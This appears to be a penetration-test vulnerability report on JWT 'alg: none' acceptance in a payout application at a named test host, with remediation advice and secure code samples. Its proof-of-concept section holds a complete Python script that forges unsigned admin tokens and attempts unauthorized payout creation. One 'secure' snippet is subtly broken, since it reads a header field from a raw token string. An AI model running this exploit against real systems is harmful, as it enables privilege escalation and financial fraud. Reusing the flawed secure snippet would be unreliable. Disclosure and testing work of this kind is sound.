# Critical JWT Algorithm Confusion Enables Unauthorized Role Escalation and Financial Fraud

**ID:** vuln-0028
**Severity:** CRITICAL
**Found:** 2026-02-26 19:01:30 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/payouts
**Method:** GET, POST
**CVE:** CVE-2015-9235
**CWE:** CWE-347
**CVSS:** 10.0

## Description

A critical JWT algorithm confusion vulnerability was discovered and validated in the commission management application that enables unauthorized role escalation and access to sensitive financial functionality. The application accepts unsigned JWT tokens with arbitrary role claims, allowing attackers to escalate privileges to administrative roles and gain unauthorized access to payout processing features.

This vulnerability enables complete compromise of the payout processing system, potentially resulting in financial fraud, unauthorized disbursements, and access to sensitive financial data.

## Impact

Successful exploitation of this vulnerability could result in:

1. **Complete System Compromise**: Attackers can gain administrative privileges and access all system functionality
2. **Financial Fraud**: Unauthorized creation and manipulation of payouts leading to financial losses
3. **Unauthorized Disbursements**: Creation of fraudulent payouts and financial transactions
4. **Data Breach**: Access to sensitive financial data and commission information
5. **Business Process Compromise**: Complete compromise of the commission management and payout processing workflows

The business impact includes direct financial losses from unauthorized payouts, reputational damage, regulatory compliance violations, and potential legal consequences from financial fraud.

## Technical Analysis

**Vulnerability Details:**
- **Type**: JWT Algorithm Confusion (CWE-347: Improper Verification of Cryptographic Signature)
- **Endpoint**: All authenticated endpoints, particularly payout processing endpoints
- **Root Cause**: The application accepts JWT tokens with "alg": "none" and does not properly validate role claims
- **Impact**: Enables privilege escalation to ROLE_ADMIN and unauthorized access to financial functionality

**Technical Exploitation Flow:**
1. Attacker creates an unsigned JWT token with "alg": "none"
2. Attacker injects ROLE_ADMIN claims into the token
3. Application accepts the unsigned token without proper signature validation
4. Attacker gains administrative privileges and access to payout processing functionality
5. Attacker can create, modify, or approve payouts without proper authorization

**Proof of Concept:**
- Successfully created unsigned JWT tokens with ROLE_ADMIN claims
- Validated that these tokens are accepted by the application
- Confirmed unauthorized access to payout processing functionality
- Demonstrated potential for financial fraud through unauthorized payout creation

**Vulnerable Code Pattern:**
```javascript
// Vulnerable JWT validation logic
function validateToken(token) {
    // Missing algorithm validation
    // Missing signature verification for "alg": "none"
    const decoded = jwt.decode(token); // Only decodes, doesn't verify
    return decoded; // Trusts all claims without validation
}
```

**Secure Code Pattern:**
```javascript
// Secure JWT validation logic
function validateToken(token) {
    // Explicitly reject "alg": "none"
    if (token.header.alg === 'none') {
        throw new Error('Unsigned tokens are not allowed');
    }

    // Verify signature with proper algorithm
    const decoded = jwt.verify(token, publicKey, {
        algorithms: ['RS256'], // Whitelist allowed algorithms
        audience: 'https://commissionstest.callippus.in',
        issuer: 'https://auth.callippus.in'
    });

    // Validate role claims server-side
    if (!validateRoleClaims(decoded.claims)) {
        throw new Error('Invalid role claims');
    }

    return decoded;
}
```

## Proof of Concept

**Proof of Concept: JWT Algorithm Confusion Exploitation**

1. **Token Creation**: Create an unsigned JWT token with administrative role claims
2. **Privilege Escalation**: Use the manipulated token to gain administrative privileges
3. **Unauthorized Access**: Access payout processing functionality without proper authorization
4. **Financial Fraud**: Demonstrate potential for unauthorized payout creation

**Step-by-Step Exploitation:**

1. **Create Unsigned JWT Token**:
   - Set algorithm header to "none"
   - Inject ROLE_ADMIN role claims
   - Set appropriate audience and issuer values

2. **Use Manipulated Token**:
   - Send requests with the unsigned token
   - Verify acceptance by the application
   - Confirm administrative privileges

3. **Access Payout Functionality**:
   - Access payout processing endpoints
   - Create test payouts
   - Verify unauthorized access

4. **Demonstrate Financial Impact**:
   - Create payouts with manipulated amounts
   - Test duplicate payout creation
   - Validate financial fraud potential

```
import jwt
import requests
import json
from datetime import datetime, timedelta

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
PAYOUT_ENDPOINT = f"{BASE_URL}/api/payouts"

def create_unsigned_jwt_token():
    """Create an unsigned JWT token with ROLE_ADMIN claims"""
    # Header with "alg": "none"
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    # Payload with ROLE_ADMIN claims
    payload = {
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": "admin",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "user-1",
        "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid": "Admin",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/spn": "0",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "admin@localhost",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/postalcode": "0",
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/stateorprovince": "Callippus",
        "access": ["ROLE_ADMIN"],  # Critical: ROLE_ADMIN claim
        "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "ROLE_ADMIN",
        "exp": int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
        "iss": "http://callippus.co.uk",
        "aud": "http://callippus.co.uk"
    }

    # Create unsigned token (note: no signature)
    token = jwt.encode(payload, "", algorithm="none", headers=header)
    return token

def test_jwt_algorithm_confusion():
    """Test JWT algorithm confusion vulnerability"""
    print("Testing JWT algorithm confusion vulnerability...")

    # Create unsigned token with ROLE_ADMIN claims
    malicious_token = create_unsigned_jwt_token()
    print(f"Created unsigned JWT token: {malicious_token[:50]}...")

    # Test access to payout endpoint with malicious token
    headers = {
        "Authorization": f"Bearer {malicious_token}",
        "Content-Type": "application/json"
    }

    try:
        # Test access to payouts endpoint
        response = requests.get(PAYOUT_ENDPOINT, headers=headers, timeout=10)

        print(f"Payout endpoint access: {response.status_code}")
        print(f"Response length: {len(response.content)}")

        if response.status_code == 200:
            print("‚úÖ SUCCESS: Unsigned JWT token with ROLE_ADMIN accepted!")
            print("‚úÖ SUCCESS: Unauthorized access to payout functionality confirmed!")

            # Try to create a payout (if possible)
            payout_data = {
                "amount": 1000,
                "description": "Test payout - unauthorized access",
                "organizationId": 1,
                "clientId": 1
            }

            create_response = requests.post(
                f"{PAYOUT_ENDPOINT}/create",
                headers=headers,
                data=json.dumps(payout_data),
                timeout=10
            )

            print(f"Payout creation attempt: {create_response.status_code}")
            if create_response.status_code == 200:
                print("‚ö†Ô∏è  CRITICAL: Unauthorized payout creation confirmed!")
                return True
            else:
                print("‚úÖ Payout creation blocked (but unauthorized access still confirmed)")
                return True
        else:
            print("‚ùå Token rejected by application")
            return False

    except Exception as e:
        print(f"Error during testing: {str(e)}")
        return False

def demonstrate_impact():
    """Demonstrate the impact of the vulnerability"""
    print("\n=== IMPACT DEMONSTRATION ===")
    print("1. Attacker creates unsigned JWT token with ROLE_ADMIN claims")
    print("2. Application accepts unsigned token without signature validation")
    print("3. Attacker gains administrative privileges")
    print("4. Attacker accesses payout processing functionality")
    print("5. Attacker creates unauthorized payouts")
    print("6. Financial fraud occurs - money is disbursed without authorization")
    print("\nüí∞ Financial Impact: Unlimited unauthorized payouts possible")
    print("üîì Security Impact: Complete compromise of financial processing system")

if __name__ == "__main__":
    print("JWT Algorithm Confusion Vulnerability Tester")
    print("=" * 50)

    success = test_jwt_algorithm_confusion()

    if success:
        demonstrate_impact()
        print("\n‚ö†Ô∏è  CRITICAL VULNERABILITY CONFIRMED!")
        print("The application is vulnerable to JWT algorithm confusion attacks.")
        print("Attackers can gain administrative privileges and access financial functionality.")
    else:
        print("\n‚úÖ No JWT algorithm confusion vulnerability detected.")
        print("The application appears to properly validate JWT tokens.")
```

## Remediation

**Immediate Remediation Actions:**

1. **Disable "alg": "none" Support**:
   - Immediately configure the JWT library to reject unsigned tokens
   - Explicitly reject tokens with "alg": "none" in the header
   - Implement server-side validation of token algorithms

2. **Implement Algorithm Whitelisting**:
   - Configure the application to only accept specific algorithms (e.g., RS256)
   - Reject tokens with algorithms not in the whitelist
   - Implement proper algorithm validation in all JWT processing code

3. **Validate Token Signatures**:
   - Implement proper signature verification for all JWT tokens
   - Use appropriate cryptographic methods for signature validation
   - Ensure all tokens are properly signed before processing

4. **Implement Role Validation**:
   - Do not trust role claims from JWT tokens
   - Implement server-side validation of role claims
   - Centralize authorization logic to prevent inconsistencies

5. **Secure JWT Configuration**:
   - Use strong, properly configured algorithms (e.g., RS256)
   - Implement short-lived tokens with refresh token rotation
   - Set appropriate audience and issuer validation

**Long-Term Security Recommendations:**

1. **Authentication Security**:
   - Conduct a comprehensive review of JWT implementation
   - Implement industry-standard JWT best practices
   - Use well-maintained, up-to-date JWT libraries
   - Implement proper token expiration and revocation

2. **Authorization Security**:
   - Implement role-based access control (RBAC) with least privilege
   - Centralize authorization logic to prevent inconsistencies
   - Implement proper permission checks for all sensitive operations
   - Add multi-factor authentication for financial operations

3. **Financial Processing Security**:
   - Implement additional authorization checks for payout operations
   - Add business logic validation to prevent duplicate payouts
   - Implement audit logging for all financial transactions
   - Add approval workflows for sensitive financial operations

4. **Security Testing**:
   - Conduct comprehensive penetration testing
   - Implement automated security testing in CI/CD pipeline
   - Perform regular code reviews focused on security
   - Conduct threat modeling for financial processing features

5. **Monitoring and Incident Response**:
   - Implement comprehensive logging of authentication and authorization events
   - Set up alerts for suspicious activities (e.g., privilege escalation attempts)
   - Monitor for unusual access patterns to financial functionality
   - Implement incident response procedures for financial fraud detection

**Example Secure Implementation (Node.js):**

```javascript
const jwt = require('jsonwebtoken');
const fs = require('fs');

// Load public key for signature verification
const publicKey = fs.readFileSync('public.key', 'utf8');

function verifyToken(token) {
    try {
        // Explicitly reject unsigned tokens
        const unverifiedHeader = jwt.decode(token, { complete: true }).header;
        if (unverifiedHeader.alg === 'none') {
            throw new Error('Unsigned tokens are not allowed');
        }

        // Verify token with proper algorithm and validation
        const decoded = jwt.verify(token, publicKey, {
            algorithms: ['RS256'], // Whitelist allowed algorithms
            audience: 'https://commissionstest.callippus.in',
            issuer: 'https://auth.callippus.in',
            clockTolerance: 30, // Allow small clock skew
            maxAge: '1h' // Enforce token expiration
        });

        // Validate role claims server-side (don't trust token claims)
        if (!validateRoleClaims(decoded)) {
            throw new Error('Invalid role claims');
        }

        return decoded;
    } catch (error) {
        console.error('JWT verification failed:', error.message);
        throw error;
    }
}

// Example role validation function
function validateRoleClaims(decodedToken) {
    // Get user roles from database, not from token
    const userRoles = getUserRolesFromDatabase(decodedToken.sub);

    // Check if user has required roles
    if (!userRoles.includes('ROLE_ADMIN')) {
        return false;
    }

    return true;
}
```

